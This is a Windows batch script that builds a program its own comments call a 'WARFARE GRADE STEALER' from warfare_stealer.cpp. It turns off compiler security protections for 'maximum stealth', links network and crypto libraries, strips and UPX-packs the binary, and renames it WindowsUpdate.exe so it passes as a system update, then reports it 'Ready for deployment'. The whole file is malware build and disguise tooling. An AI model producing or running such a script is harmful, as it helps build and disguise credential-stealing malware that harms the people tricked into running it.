@echo off
echo [*] Building WARFARE GRADE STEALER...
echo.

:: Setup Visual Studio
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

:: Compile with maximum stealth
cl /O2 /MT /GS- /GL- /Gy- /EHsc /DUNICODE /D_UNICODE /W0 warfare_stealer.cpp /link /SUBSYSTEM:WINDOWS /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:Warfare.exe user32.lib kernel32.lib advapi32.lib ole32.lib oleaut32.lib urlmon.lib wininet.lib crypt32.lib iphlpapi.lib shlwapi.lib

:: Stripping and compression
if exist Warfare.exe (
    echo [*] Stripping symbols...
    strip Warfare.exe
    
    echo [*] Compressing with UPX...
    upx --ultra-brute Warfare.exe -o WindowsUpdate.exe
    
    del Warfare.exe
    
    echo.
    echo [✓] SUCCESS! File: WindowsUpdate.exe
    echo [✓] Size: %~z0 bytes
    echo [✓] Ready for deployment
) else (
    echo [✗] Compilation failed
)

pause